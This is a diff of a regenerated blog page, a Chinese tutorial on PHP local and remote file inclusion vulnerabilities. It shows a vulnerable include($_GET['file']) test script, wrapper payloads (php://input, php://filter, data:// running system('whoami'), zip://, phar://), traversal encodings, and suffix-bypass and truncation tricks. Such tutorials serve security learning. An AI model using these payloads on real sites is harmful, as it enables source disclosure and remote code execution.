@@ -167,10 +167,10 @@
         2020-11-25
       </span>
 
-                                                                        <span class="post-pubtime"> 本文共1.2k字 </span>
+                                                                        <span class="post-pubtime"> 本文共1.1k字 </span>
 
                                                                         <span class="post-pubtime">
-        大约需要8min
+        大约需要7min
       </span>
 
                                                                         
@@ -199,25 +199,32 @@
                                                                     </div>
                                                                     <div class="markdown-body">
                                                                         <p>[TOC]</p>
-<h1 id="1-文件包含相关函数"><a href="#1-文件包含相关函数" class="headerlink" title="1.文件包含相关函数"></a>1.文件包含相关函数</h1><p>​	include()，include_once()，require()，require_once()</p>
+<h1 id="文件包含相关函数">1.文件包含相关函数</h1>
+<p>​ include()，include_once()，require()，require_once()</p>
 <ul>
 <li>require()函数如果在包含的时候有错，如文件不存在，会直接退出，不执行后面的语句</li>
 <li>include()函数如果在包含的时候有错，如文件不存在，不会直接退出，会执行后面的语句</li>
 <li>*_once()与*()的作用类似，如果一个文件已经被包含，则*_once()不会再包含它，避免函数重新定义或者变量重新赋值等</li>
 </ul>
-<p>​	用这几个函数包含文件时，无论什么类型的文件，都会当做php文件进行解析。</p>
-<p>​	分类：</p>
+<p>​ 用这几个函数包含文件时，无论什么类型的文件，都会当做php文件进行解析。</p>
+<p>​ 分类：</p>
 <ul>
-<li><p>LFI（Local File Inclusion）</p>
-</li>
+<li><p>LFI（Local File Inclusion）</p></li>
 <li><p>RFI（Remote File Inclusion）</p>
-<p>利用条件较为苛刻，allow_url_fopen &#x3D; on，all_url_include &#x3D; on</p>
-<p>两个配置选项均需on，才能远程包含文件成功。</p>
-</li>
+<p>利用条件较为苛刻，allow_url_fopen = on，all_url_include = on</p>
+<p>两个配置选项均需on，才能远程包含文件成功。</p></li>
 </ul>
-<h1 id="2-文件包含漏洞的利用方式–伪协议"><a href="#2-文件包含漏洞的利用方式–伪协议" class="headerlink" title="2.文件包含漏洞的利用方式–伪协议"></a>2.文件包含漏洞的利用方式–伪协议</h1><table>
+<h1 id="文件包含漏洞的利用方式--伪协议">2.文件包含漏洞的利用方式--伪协议</h1>
+<table>
+<colgroup>
+<col style="width: 14%">
+<col style="width: 6%">
+<col style="width: 13%">
+<col style="width: 13%">
+<col style="width: 52%">
+</colgroup>
 <thead>
-<tr>
+<tr class="header">
 <th>协议</th>
 <th>测试版本</th>
 <th>allow_url_fopen</th>
@@ -225,126 +232,128 @@
 <th>用法</th>
 </tr>
 </thead>
-<tbody><tr>
-<td>file:&#x2F;&#x2F;</td>
-<td>&gt;&#x3D;5.2</td>
-<td>off&#x2F;on</td>
-<td>off&#x2F;on</td>
-<td>?file&#x3D;file:&#x2F;&#x2F;D:&#x2F;phpstudy&#x2F;WWW&#x2F;phpcode.txt</td>
+<tbody>
+<tr class="odd">
+<td>file://</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td>off/on</td>
+<td>?file=file://D:/phpstudy/WWW/phpcode.txt</td>
 </tr>
-<tr>
-<td>php:&#x2F;&#x2F;filter</td>
-<td>&gt;&#x3D;5.2</td>
-<td>off&#x2F;on</td>
-<td>off&#x2F;on</td>
-<td>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;index.php</td>
+<tr class="even">
+<td>php://filter</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td>off/on</td>
+<td>?file=php://filter/read=convert.base64-encode/resource=./index.php</td>
 </tr>
-<tr>
-<td>php:&#x2F;&#x2F;input</td>
-<td>&gt;&#x3D;5.2</td>
-<td>off&#x2F;on</td>
+<tr class="odd">
+<td>php://input</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
 <td>on</td>
-<td>?file&#x3D;php:&#x2F;&#x2F;input             [POST DATA] <?php phpinfo()?></td>
+<td>?file=php://input [POST DATA] <?php phpinfo()?></td>
 </tr>
-<tr>
-<td>zip:&#x2F;&#x2F;</td>
-<td>&gt;&#x3D;5.2</td>
-<td>off&#x2F;on</td>
-<td>off&#x2F;on</td>
-<td>?file&#x3D;zip:&#x2F;&#x2F;D:&#x2F;phpstydy&#x2F;WWW&#x2F;file.zip#phpcode.txt</td>
+<tr class="even">
+<td>zip://</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td>off/on</td>
+<td>?file=zip://D:/phpstydy/WWW/file.zip#phpcode.txt</td>
 </tr>
-<tr>
-<td>data:&#x2F;&#x2F;</td>
-<td>&gt;&#x3D;5.2</td>
+<tr class="odd">
+<td>data://</td>
+<td>&gt;=5.2</td>
 <td>on</td>
 <td>on</td>
-<td>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo()?>                        [OR]?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,[base64编码]                   [oR]?file&#x3D;data:text&#x2F;plain,<?php phpinfo()?>                           [OR]?file&#x3D;data:text&#x2F;plain;base64,[base64编码]</td>
+<td>?file=data://text/plain,<?php phpinfo()?> [OR]?file=data://text/plain;base64,[base64编码] [oR]?file=data:text/plain,<?php phpinfo()?> [OR]?file=data:text/plain;base64,[base64编码]</td>
 </tr>
-</tbody></table>
-<p>php:&#x2F;&#x2F;filter  是一种元封装器，设计用于数据楼打开是的筛选过滤应用</p>
-<p>data:&#x2F;&#x2F;   同样类似于php:&#x2F;&#x2F;input，可以让用户控制输入流</p>
-<p>php:&#x2F;&#x2F;input可以访问请求的原始数据的制度刘，将post请求的数据当做PHP代码执行</p>
-<p>phar:&#x2F;&#x2F;xxxx.png&#x2F;shell.php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压</p>
-<h2 id="之后的测试代码"><a href="#之后的测试代码" class="headerlink" title="之后的测试代码"></a>之后的测试代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//www目录</span></span><br><span class="line">    <span class="comment">//有a.txt，<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line">    <span class="comment">//有a.zip,里面含a.txt</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><p>​	利用条件：</p>
+</tbody>
+</table>
+<p>php://filter 是一种元封装器，设计用于数据楼打开是的筛选过滤应用</p>
+<p>data:// 同样类似于php://input，可以让用户控制输入流</p>
+<p>php://input可以访问请求的原始数据的制度刘，将post请求的数据当做PHP代码执行</p>
+<p>phar://xxxx.png/shell.php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压</p>
+<h2 id="之后的测试代码">之后的测试代码</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//www目录</span></span><br><span class="line">    <span class="comment">//有a.txt，<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line">    <span class="comment">//有a.zip,里面含a.txt</span></span><br></pre></td></tr></table></figure>
+<h2 id="phpinput">php://input</h2>
+<p>​ 利用条件：</p>
 <blockquote>
-<p>​		allow_url_include&#x3D;on，allow_url_fopen不做要求</p>
+<p>​ allow_url_include=on，allow_url_fopen不做要求</p>
 </blockquote>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">姿势：</span><br><span class="line">/?file=php:<span class="comment">//input</span></span><br><span class="line">[post]</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><blockquote>
-<p>​	利用条件：上面的那两个配置文件选项都不做要求</p>
+<h2 id="phpfilter">php://filter</h2>
+<blockquote>
+<p>​ 利用条件：上面的那两个配置文件选项都不做要求</p>
 </blockquote>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">姿势</span><br><span class="line">/?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=a.txt</span></span><br><span class="line">/?file=php:<span class="comment">//filter/convert.base64-encode/resource=a.txt</span></span><br></pre></td></tr></table></figure>
-
-<p>​	通过指定末尾的文件，可以读取经base64加密后的文件源码，虽然不能获取shell，但危害也挺大。</p>
-<h2 id="phar-x2F-x2F"><a href="#phar-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h2><blockquote>
-<p>​	利用条件：PHP版本&gt;&#x3D;5.3.0</p>
+<p>​ 通过指定末尾的文件，可以读取经base64加密后的文件源码，虽然不能获取shell，但危害也挺大。</p>
+<h2 id="phar">phar://</h2>
+<blockquote>
+<p>​ 利用条件：PHP版本&gt;=5.3.0</p>
 </blockquote>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">假设有个a.zip压缩包，里面有个a.txt里面有<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br><span class="line">/?file=phar:<span class="comment">//a.zip/a.txt</span></span><br><span class="line">绝对相对路径都OK</span><br></pre></td></tr></table></figure>
-
-<h2 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h2><blockquote>
+<h2 id="zip">zip://</h2>
+<blockquote>
 <p>利用条件：</p>
-<p>​	PHP版本&gt;&#x3D;5.3.0</p>
-<p>​	需要绝对路径，同时编码#为%23</p>
+<p>​ PHP版本&gt;=5.3.0</p>
+<p>​ 需要绝对路径，同时编码#为%23</p>
 </blockquote>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?file=zip:<span class="comment">//D:\wamp64\www\a.zip%23a.txt</span></span><br><span class="line"><span class="comment">//如果使用相对路径，包含会失败。</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><blockquote>
+<h2 id="data">data://</h2>
+<blockquote>
 <p>利用条件：</p>
-<p>​	1.PHP版本大于5.2</p>
-<p>​	2.allow_url_fopen&#x3D;on</p>
-<p>​	3.allow_url_include&#x3D;on</p>
+<p>​ 1.PHP版本大于5.2</p>
+<p>​ 2.allow_url_fopen=on</p>
+<p>​ 3.allow_url_include=on</p>
 </blockquote>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">姿势一：</span><br><span class="line">	/?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">	/?file=data:text/plain,&lt;?php system(&#x27;whoami&#x27;)?&gt;</span><br><span class="line">姿势二：</span><br><span class="line">	/?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br><span class="line">	+号的URL编码%2b,base64解码为&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="3-绕过"><a href="#3-绕过" class="headerlink" title="3.绕过"></a>3.绕过</h1><p>正常平台不可能直接是 <code>include $_GET[&#39;file&#39;];</code> 这么简单，一般会指定前后缀</p>
-<h2 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    include &#x27;/var/www/html/&#x27;.$file;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>​		假设&#x2F;var&#x2F;log&#x2F;test.txt中有代码<?php phpinfo();?></p>
+<h1 id="绕过">3.绕过</h1>
+<p>正常平台不可能直接是 <code>include $_GET['file'];</code> 这么简单，一般会指定前后缀</p>
+<h2 id="指定前缀">指定前缀</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    include &#x27;/var/www/html/&#x27;.$file;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="目录遍历">目录遍历</h3>
+<p>​ 假设/var/log/test.txt中有代码<?php phpinfo();?></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=../../log/test.txt</span><br></pre></td></tr></table></figure>
-
-<p>​	服务器会对..&#x2F;等做过滤，可以用编码来绕过</p>
+<p>​ 服务器会对../等做过滤，可以用编码来绕过</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">利用url编码</span><br><span class="line">	../</span><br><span class="line">		%2e%2e%2f</span><br><span class="line">		..%2f</span><br><span class="line">		%2e%2e/</span><br><span class="line">	..\</span><br><span class="line">		%2e%2e%5c</span><br><span class="line">		..%5c</span><br><span class="line">		%2e%2e\</span><br><span class="line">二次编码</span><br><span class="line">	../</span><br><span class="line">		%252e%252e%252f</span><br><span class="line">	..\</span><br><span class="line">		%252e%252e%255c</span><br></pre></td></tr></table></figure>
-
-<h2 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">测试代码：</span><br><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    include $file.&#x27;/test/test.php&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><p>URL： <code>protocol :// hostname[:port] / path / [;parameters][?query]#fragment</code></p>
+<h2 id="指定后缀">指定后缀</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">测试代码：</span><br><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    include $file.&#x27;/test/test.php&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="url">URL</h3>
+<p>URL： <code>protocol :// hostname[:port] / path / [;parameters][?query]#fragment</code></p>
 <p>在RFI中，可以利用query或fragment来绕过</p>
-<h4 id="姿势一：query"><a href="#姿势一：query" class="headerlink" title="姿势一：query(?)"></a>姿势一：query(?)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=http://xxxx/info.txt?</span><br></pre></td></tr></table></figure>
-
+<h4 id="姿势一query">姿势一：query(?)</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=http://xxxx/info.txt?</span><br></pre></td></tr></table></figure>
 <p>则包含的文件为 <code>http://xxxx/info.txt?/test/test.php</code></p>
 <p>问号后面的 <code>/test/test.php</code> 被当做query后缀而被绕过</p>
-<h4 id="姿势二：fragment"><a href="#姿势二：fragment" class="headerlink" title="姿势二：fragment(#)"></a>姿势二：fragment(#)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=http://xxxx/info.txt%23</span><br></pre></td></tr></table></figure>
-
+<h4 id="姿势二fragment">姿势二：fragment(#)</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=http://xxxx/info.txt%23</span><br></pre></td></tr></table></figure>
 <p>则包含的文件为 <code>http://xxxx/info.txt#/test/test.php</code></p>
 <p>#后面的 <code>/test/test.php</code> 被当做query后缀而被绕过，需要将#编码为%23</p>
-<h3 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">测试代码：</span><br><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    include $file.&quot;phpinfo.txt&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="zip-x2F-x2F-1"><a href="#zip-x2F-x2F-1" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h4><ul>
+<h3 id="利用协议">利用协议</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">测试代码：</span><br><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    include $file.&quot;phpinfo.txt&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="zip-1">zip://</h4>
+<ul>
 <li>[访问参数] <code>?file=zip://D:\zip.jpg%23phpinfo</code></li>
 <li>[拼接后]  <code>?file=zip://D:\zip.jpg#phpinfo.txt</code></li>
 </ul>
-<h4 id="phar-x2F-x2F-1"><a href="#phar-x2F-x2F-1" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h4><ul>
+<h4 id="phar-1">phar://</h4>
+<ul>
 <li>[访问参数] <code>?file=phar://xx.zip/phpinfo</code></li>
 <li>[拼接后]  <code>?file=phar://xx.zip/phpinfo.txt</code></li>
 </ul>
-<p><strong>Example：</strong><br>目录中有a.zip压缩包，内含a.txt，其中包含代码<?php phpinfo();?><br>构造payload为：</p>
+<p><strong>Example：</strong> 目录中有a.zip压缩包，内含a.txt，其中包含代码<?php phpinfo();?> 构造payload为：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=zip://D:\phpstudy\www\a.zip%23a.txt</span><br><span class="line">?file=phar://../../a.zip/a.txt</span><br></pre></td></tr></table></figure>
-
-<h2 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h2><p><code>一共有三种：../     ./    和.(点号)</code></p>
+<h2 id="长度截断">长度截断</h2>
+<p><code>一共有三种：../     ./    和.(点号)</code></p>
 <p>Windows 256,Linux 4096</p>
 <p>利用条件：php版本&lt;5.2.8</p>
-<p>只要.&#x2F;不断重复()，则后缀<code>/test/test.php</code>，在达到最大值后会被直接丢弃掉。</p>
+<p>只要./不断重复()，则后缀<code>/test/test.php</code>，在达到最大值后会被直接丢弃掉。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=././..........././shell.txt</span><br></pre></td></tr></table></figure>
-
-<h2 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h2><p>利用条件：</p>
+<h2 id="截断">00截断</h2>
+<p>利用条件：</p>
 <p><code>php版本&lt;5.3.4</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=phpinfo.txt%00</span><br></pre></td></tr></table></figure>
-
 
                                                                     </div>
                                                                     
@@ -406,7 +415,7 @@
     <div class="title">Contents</div>
     <div class="catalog-content">
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-text">1.文件包含相关函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E2%80%93%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">2.文件包含漏洞的利用方式–伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%8B%E5%90%8E%E7%9A%84%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"><span class="toc-text">之后的测试代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-x2F-x2F-input"><span class="toc-text">php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-x2F-x2F-filter"><span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar-x2F-x2F"><span class="toc-text">phar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zip-x2F-x2F"><span class="toc-text">zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#data-x2F-x2F"><span class="toc-text">data:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E7%BB%95%E8%BF%87"><span class="toc-text">3.绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80"><span class="toc-text">指定前缀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-text">目录遍历</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80"><span class="toc-text">指定后缀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#URL"><span class="toc-text">URL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%B8%80%EF%BC%9Aquery"><span class="toc-text">姿势一：query(?)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%BA%8C%EF%BC%9Afragment"><span class="toc-text">姿势二：fragment(#)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8D%8F%E8%AE%AE"><span class="toc-text">利用协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#zip-x2F-x2F-1"><span class="toc-text">zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phar-x2F-x2F-1"><span class="toc-text">phar:&#x2F;&#x2F;</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD"><span class="toc-text">长度截断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD"><span class="toc-text">00截断</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-text">1.文件包含相关函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F--%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">2.文件包含漏洞的利用方式--伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%8B%E5%90%8E%E7%9A%84%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"><span class="toc-text">之后的测试代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpinput"><span class="toc-text">php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpfilter"><span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar"><span class="toc-text">phar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zip"><span class="toc-text">zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#data"><span class="toc-text">data:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-text">3.绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80"><span class="toc-text">指定前缀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-text">目录遍历</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80"><span class="toc-text">指定后缀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#url"><span class="toc-text">URL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%B8%80query"><span class="toc-text">姿势一：query(?)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%BA%8Cfragment"><span class="toc-text">姿势二：fragment(#)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8D%8F%E8%AE%AE"><span class="toc-text">利用协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#zip-1"><span class="toc-text">zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phar-1"><span class="toc-text">phar:&#x2F;&#x2F;</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD"><span class="toc-text">长度截断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%AA%E6%96%AD"><span class="toc-text">00截断</span></a></li></ol></li></ol>
       
     </div>
   </div>
